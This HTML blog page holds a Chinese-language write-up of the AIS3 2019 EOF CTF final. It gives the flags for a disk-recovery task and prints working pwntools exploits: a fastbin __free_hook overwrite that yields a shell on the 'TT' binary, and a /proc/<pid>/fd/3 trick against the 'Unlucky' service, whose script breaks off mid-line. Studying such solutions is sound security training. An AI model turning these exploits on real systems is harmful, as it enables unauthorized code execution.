<!DOCTYPE html>
<html>
  
<head>
  <meta charset="utf-8">
  <meta name="author" content="oToToT" />
  
  
  <title>AIS3 2019 EOF 決賽 write-up | oToToT Blog</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="write-up,AIS3,CTF," />
  

  
  <meta name="description" content="紀錄oToToT的各種瑣事">

  

  

  
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async>
      MathJax.Hub.Config({
        TeX: { equationNumbers: { autoNumber: "AMS"  }  },
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          displayMath: [ ['$$','$$'], ["\\[","\\]"]  ],
          processEscapes: true 
        },
        'HTML-CSS': { scale: 90  },
         displayIndent: '2em'                                    
      });
    </script>
  

  

  

  <script>
  // theme-ad's config script
  // it can be used in every script
  
  window.AD_CONFIG = {
    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":false},
    welcome: {"enable":false,"interval":30},
    start_time: "2019-06-15",
    passwords: ["c967350c7e652c6305ef7c7dba4feb6b1106bba85fbef5d08d1897ef42fd5ffd", ],
    is_post: true,
    lock: false,
    author: "oToToT",
    share: {"twitter":true,"facebook":true,"weibo":false,"qq":false,"wechat":false},
    mathjax: true,
    page_type: "",
    root: "/"
  };
</script>

  
<script src="/vendor/sha256.min.js"></script>
<script src="/js/auth.js"></script>
<script src="/js/index.js"></script>
<script src="/vendor/qrcode.min.js"></script>


  
    <link rel="icon" href="/images/favicon.ico">
    <link rel="apple-touch-icon" href="/images/touch-icon.png">
  

  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

  
<link rel="stylesheet" href="/css/index.css">
<link rel="stylesheet" href="/styles/components/highlight/highlight.css">


  
<meta name="generator" content="Hexo 5.4.0"></head>

  <body>
    <header class="site-header">
  <div class="site-header-brand">
    
      <span class="site-header-brand-title">
        <a href="/">oToToT</a>
      </span>
    
    
      <span class="site-header-brand-motto"> | 存在與不存在，無論事物的想法</span>
    
  </div>
  <div class="site-header-right">
    <nav class="site-header-navigation">
      
        <a href="/" target="_self">首頁</a>
      
        <a href="/archives/" target="_self">文章列表</a>
      
        <a href="/tags/" target="_self">標籤</a>
      
        <a href="/categories/" target="_self">分類</a>
      
        <a href="/about/" target="_self">關於</a>
      
    </nav>
    <div class="site-header-btn">
      
        <a href="https://github.com/oToToT/" target="_blank" id="site-github">
          <i class="fa fa-github-alt"></i>
        </a>
      
      <a href="javascript:void(0);" id="site-search">
        <i class="fa fa-search"></i>
      </a>
      <a href="javascript:void(0);" id="site-nav-btn">
        <i class="fa fa-ellipsis-v"></i>
      </a>
    </div>
  </div>
</header>
<nav class="table-content" id="site-nav">
  <div class="table-content-title">
    <span>导航</span>
  </div>
  <div class="table-content-main">
    <ol class="toc">
      
        <li class="toc-item">
          <a href="/" target="_self">
            首頁
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/archives/" target="_self">
            文章列表
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/tags/" target="_self">
            標籤
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/categories/" target="_self">
            分類
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/about/" target="_self">
            關於
          </a>
        </li>
      
    </ol>
  </div>
</nav>
<div id="site-process"></div>
    <main>
      
  <div class="passage">
  <div class="passage-meta">
    <span>
      <i class="fa fa-calendar"></i>2020-02-06
    </span>
    
      <span>
        | <a href="/categories/write-up/"><i class="fa fa-bookmark"></i>write-up</a>
      </span>
    
    
      <span>
        | <i class="fa fa-unlock-alt"></i>UNLOCK
      </span>
    
  </div>
  <h1 class="passage-title">
    AIS3 2019 EOF 決賽 write-up
  </h1>
  
  <article class="passage-article">
    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一樣先附個記分板，然後初賽的部分因為我失憶(?)了，所以就不附了，而且我也不記得題目了w</p>
<p><img src="scoreboard.png" alt="AIS3 EOF scoreboard"></p>
<p>超過半年沒來這裡寫東西了w</p>
<p>這半年做了滿多事的，也開始跟<a target="_blank" rel="noopener" href="https://ctftime.org/team/61603">10sec</a>打了一些比賽，靠著台灣保送名額也在場外打過HITCON Final (Attack &amp; Defense類的CTF)了w</p>
<p>不過自己真的還是好弱，還有很多很多東西還沒學，原本大一上想跟著旁聽計算機安全，不過後來因為發生一些事也沒聽完</p>
<p>這次是splitline突然密我要不要一起組隊打EOF，不然其實也沒考慮要打w</p>
<p>總之最後還是進了決賽，不過超遺憾的是這次決賽因為2019-nCoV(武漢肺炎)的原因直接變成在家打，而且打兩天，其實有點失望，而且實際上打得時候總題不太勁來…</p>
<p>最後拿了第五，不過完全沒感覺w跟上面差距太大了QAQ，而且我們整隊沒人做pwn，感覺超傷的…</p>
<p>總之，先附個官方write-up好了，不過不是很完整</p>
<ul>
<li>PWN<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/yuawn/CTF/tree/master/2020/eof-final">https://github.com/yuawn/CTF/tree/master/2020/eof-final</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/how2hack/my-ctf-challenges/tree/master/eof_finalctf-2020">https://github.com/how2hack/my-ctf-challenges/tree/master/eof_finalctf-2020</a></li>
</ul>
</li>
<li>Web<ul>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/CykuTW/edb0d7b39ecdc16a16cc05b149181a02">https://gist.github.com/CykuTW/edb0d7b39ecdc16a16cc05b149181a02</a></li>
<li><a target="_blank" rel="noopener" href="https://hackmd.io/gwfYtqxwTz-DZ9H0g4UUAw?view">https://hackmd.io/gwfYtqxwTz-DZ9H0g4UUAw?view</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/BookGin/my-ctf-challenges#ais3-eof-ctf-2019-finals">https://github.com/BookGin/my-ctf-challenges#ais3-eof-ctf-2019-finals</a></li>
</ul>
</li>
<li>Crypto<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/how2hack/my-ctf-challenges/tree/master/eof_finalctf-2020">https://github.com/how2hack/my-ctf-challenges/tree/master/eof_finalctf-2020</a></li>
</ul>
</li>
<li>Misc<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/how2hack/my-ctf-challenges/tree/master/eof_finalctf-2020">https://github.com/how2hack/my-ctf-challenges/tree/master/eof_finalctf-2020</a></li>
</ul>
</li>
</ul>
<p>接下來把我有做的東東寫一寫好了，雖然因為我太晚起有些flag不是我丟的w，然後剩下可能附個檔案這樣w</p>
<p>阿如果有人想撤掉檔案的話，歡迎PM我，或是去開個<a target="_blank" rel="noopener" href="https://github.com/oToToT/oToToT.github.io/issues">issue</a>w</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="recovery"><a href="#recovery" class="headerlink" title="recovery"></a>recovery</h3><p>載下來拿到一個1GB的diskimage(也所以我沒辦法把他丟上來QAQ)，同時題目給了一個提示</p>
<blockquote>
<p>someone broke my disk! could you help me recover the important message stored in it?</p>
</blockquote>
<p>所以直接對著那個file用<a target="_blank" rel="noopener" href="https://www.cgsecurity.org/wiki/TestDisk">TestDisk</a></p>
<p>然後就找出三個檔案看起來最特別，復原回來後發現裡面是base64後的東西，把它分別decode後拿到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EOF&#123;B43kvp_3u34yth</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1ng_b3fORe_Y04_dO_A</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4y_Ch4ng3_t0_d14k&#125;</span><br></pre></td></tr></table></figure>

<p>湊起來就是完整的Flag: <code>EOF&#123;B43kvp_3u34yth1ng_b3fORe_Y04_dO_A4y_Ch4ng3_t0_d14k&#125;</code></p>
<h3 id="TT"><a href="#TT" class="headerlink" title="TT"></a>TT</h3><p>yuawn說這是pwn出爛變成misc，可是我最後還是用了一些pwn的知識(?)才做出來QAQ<br>附個檔案: <a href="TT/tt">tt</a>, <a href="TT/libc-2.29.so">libc-2.29.so</a></p>
<p>IDA F5後</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init_0();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here you are :P %p\n&quot;</span>, &amp;<span class="built_in">printf</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = dword_4010--;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    info();</span><br><span class="line">    v5 = getint();</span><br><span class="line">    <span class="keyword">switch</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( buf )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Offset: &quot;</span>);</span><br><span class="line">          ptr = (<span class="keyword">char</span> *)buf + getint();</span><br><span class="line">          <span class="keyword">if</span> ( (*((_DWORD *)ptr - <span class="number">2</span>) &amp; <span class="number">0xFFFFFFF0</span>) &lt;= <span class="number">0x80</span> )</span><br><span class="line">            <span class="built_in">free</span>(ptr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data: &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">6u</span>LL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">        v3 = getint();</span><br><span class="line">        buf = <span class="built_in">malloc</span>(v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(&amp;byte_20B7);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到他free掉之後還繼續寫東西，不過我其實不知道這樣會怎樣w</p>
<p>比賽的時候去看了<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#arbitrary-alloc">CTF-wiki</a>，發現我只要malloc, free, write, malloc, malloc就可以任意寫值，同時也看到有個東西是__free_hook，會在free的時候執行他指向的內容，所以我們就把他只到one gadget上就可以get shell了</p>
<p>附個exploit</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadget = 0x10a38c</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)</span></span><br><span class="line"><span class="comment"># o = process(&#x27;./tt&#x27;)</span></span><br><span class="line">one_gadget = <span class="number">0x106ef8</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.29.so&#x27;</span>)</span><br><span class="line">o = remote(<span class="string">&#x27;eof.ais3.org&#x27;</span>, <span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line">o.recvuntil(<span class="string">&#x27;:P&#x27;</span>)</span><br><span class="line">printf = <span class="built_in">int</span>(o.recvline().strip(), <span class="number">16</span>)</span><br><span class="line">libc_pos = printf - libc.sym.printf</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;libc = %x&quot;</span> % libc_pos)</span><br><span class="line"></span><br><span class="line">o.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">o.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">o.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">o.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">o.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">o.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">o.recvuntil(<span class="string">&#x27;Offset:&#x27;</span>)</span><br><span class="line">o.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">o.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">o.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">o.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">o.send(p64(libc_pos + libc.sym.__free_hook)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">o.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">o.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">o.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">o.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">o.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">o.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">o.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">o.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line"></span><br><span class="line">o.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">o.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">o.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">o.send(p64(libc_pos + one_gadget)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">o.recvuntil(<span class="string">&#x27;choice:&#x27;</span>)</span><br><span class="line">o.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">o.recvuntil(<span class="string">&#x27;Offset:&#x27;</span>)</span><br><span class="line">o.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">o.interactive()</span><br></pre></td></tr></table></figure>

<p>最後FLag: <code>EOF&#123;I_th1nk_th1s_sh0u1d_b3_m1sc_TT&#125;</code></p>
<h3 id="Unlucky"><a href="#Unlucky" class="headerlink" title="Unlucky"></a>Unlucky</h3><p>題目開起來拿到一個python檔，我們可以nc上去跟他互動</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    rng = <span class="built_in">open</span>(<span class="string">&#x27;/dev/urandom&#x27;</span>, encoding=<span class="string">&#x27;ISO-8859-1&#x27;</span>).read(<span class="number">32</span>)</span><br><span class="line">    rng = <span class="built_in">int</span>.from_bytes(<span class="built_in">bytes</span>(rng, <span class="string">&#x27;utf-8&#x27;</span>), <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    dirname = <span class="built_in">open</span>(<span class="string">&#x27;/dev/urandom&#x27;</span>, encoding=<span class="string">&#x27;ISO-8859-1&#x27;</span>).read(<span class="number">32</span>)</span><br><span class="line">    dirname = <span class="built_in">int</span>.from_bytes(<span class="built_in">bytes</span>(dirname, <span class="string">&#x27;utf-8&#x27;</span>), <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    dirname = <span class="string">&#x27;/tmp/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(dirname)</span><br><span class="line"></span><br><span class="line">    filename = <span class="built_in">open</span>(<span class="string">&#x27;/dev/urandom&#x27;</span>, encoding=<span class="string">&#x27;ISO-8859-1&#x27;</span>).read(<span class="number">32</span>)</span><br><span class="line">    filename = <span class="built_in">int</span>.from_bytes(<span class="built_in">bytes</span>(filename, <span class="string">&#x27;utf-8&#x27;</span>), <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    filename = <span class="string">&#x27;&#123;&#125;/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(dirname, filename)</span><br><span class="line"></span><br><span class="line">    os.mkdir(dirname)</span><br><span class="line">    f = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;&#123;&#125;\n&#x27;</span>.<span class="built_in">format</span>(rng))</span><br><span class="line">    f.flush()</span><br><span class="line"></span><br><span class="line">    shutil.rmtree(dirname)</span><br><span class="line">    chance()</span><br><span class="line">    guess(rng)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chance</span>():</span></span><br><span class="line">    cmd = <span class="built_in">input</span>(<span class="string">&#x27;Give you a chance to find the flag: &#x27;</span>).strip()[:<span class="number">20</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = subprocess.Popen(cmd.split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">        print(p.communicate()[<span class="number">0</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span>(<span class="params">rng</span>):</span></span><br><span class="line">    lucky = <span class="built_in">input</span>(<span class="string">&quot;Can&#x27;t find the flag? Then guess the lucky number: &quot;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(lucky) == rng:</span><br><span class="line">        print(<span class="string">&#x27;Enjoy your shell :)&#x27;</span>)</span><br><span class="line">        os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;May the luck be with you&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>然後<code>ls -al</code>可以看到裡面有個<code>flag</code>跟<code>readflag</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">total 92</span><br><span class="line">drwxr-xr-x   1 root root 4096 Feb  4 23:57 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Feb  4 23:57 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Feb  4 23:57 .dockerenv</span><br><span class="line">drwxr-xr-x   1 root root 4096 Feb  4 15:54 bin</span><br><span class="line">drwxr-xr-x   2 root root 4096 Apr 24  2018 boot</span><br><span class="line">drwxr-xr-x   5 root root  340 Feb  4 23:57 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 Feb  4 23:57 etc</span><br><span class="line">-r--------   1 root root   28 Feb  4 17:03 flag</span><br><span class="line">drwxr-xr-x   1 root root 4096 Feb  4 17:03 home</span><br><span class="line">drwxr-xr-x   1 root root 4096 May 23  2017 lib</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec  2 12:43 lib64</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec  2 12:43 media</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec  2 12:43 mnt</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec  2 12:43 opt</span><br><span class="line">dr-xr-xr-x 829 root root    0 Feb  4 23:57 proc</span><br><span class="line">-rwsr-xr-x   1 root root 8488 Feb  4 17:03 readflag</span><br><span class="line">-rw-r--r--   1 root root  227 Feb  4 17:03 readflag.c</span><br><span class="line">drwx------   1 root root 4096 Feb  5 00:48 root</span><br><span class="line">drwxrwxr--   1 root root 4096 Dec 19 04:21 run</span><br><span class="line">drwxr-xr-x   1 root root 4096 Feb  4 15:54 sbin</span><br><span class="line">drwxr-xr-x   2 root root 4096 Dec  2 12:43 srv</span><br><span class="line">dr-xr-xr-x  13 root root    0 Feb  4 09:17 sys</span><br><span class="line">drwx-wx-wt   1 root root 4096 Feb  6 18:02 tmp</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec  2 12:43 usr</span><br><span class="line">drwxr-xr-x   1 root root 4096 Dec  2 12:43 var</span><br></pre></td></tr></table></figure>

<p>原本以為直接跑個<code>./readflag</code>就好，結果沒成功，後來把它<code>cat</code>出來才發現他會先吃個stdin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    f = fopen(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fgets(flag, <span class="number">0xff</span>, f);</span><br><span class="line">    fgets(buf, <span class="number">0xff</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>盯了很久感覺應該一定要把檔案就回來才可以，後來發現他雖然rm掉了，可是fd沒關，所以<code>/proc/self/fd/3</code>裡還可以把它弄回來，可是因為<code>subprocess.Popen</code>的特性，fork出來的小孩不會繼承fd，所以想了一段時間才知道怎麼做，具體來說我們可以nc上去看當前的pid，接著再趕快nc上去一次，這時的pid會是上次的pid+4，所以我們就可以把它的fd cat出來的，這裡附個拿shell的python script</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">o = remote(<span class="string">&#x27;eof.ais3.org&#x27;</span>, <span class="number">29091</span>)</span><br><span class="line"></span><br><span class="line">o.recvuntil(<span class="string">&#x27;flag:&#x27;</span>)</span><br><span class="line">o.sendline(<span class="string">&#x27;ps aux --forest&#x27;</span>)</span><br><span class="line">ps = o.recvuntil(<span class="string">&#x27;lucky number:&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">o.close()</span><br><span class="line">ps = ps.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pid = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> ps:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ps aux --forest&#x27;</span> <span class="keyword">in</span> p:</span><br><span class="line">        pid = <span class="built_in">int</span>(p[<span class="number">9</span>:<span class="number">14</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">o = remote(<span class="string">&#x27;eof.ais3.org&#x27;</span>, <span class="number">29091</span>)</span><br><span class="line">o.recvuntil(<span class="string">&#x27;flag:&#x27;</span>)</span><br><span class="line">o.sendline(<span class="string">&#x27;cat /proc/%d/fd/3&#x27;</span> % (pid + <span class="number">3</span>))</span><br><span class="line">lucky = <span class="built_in">int</span>(o.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).strip())</span><br><span class="line">o.recvuntil(<span class="string">&#x27;lucky 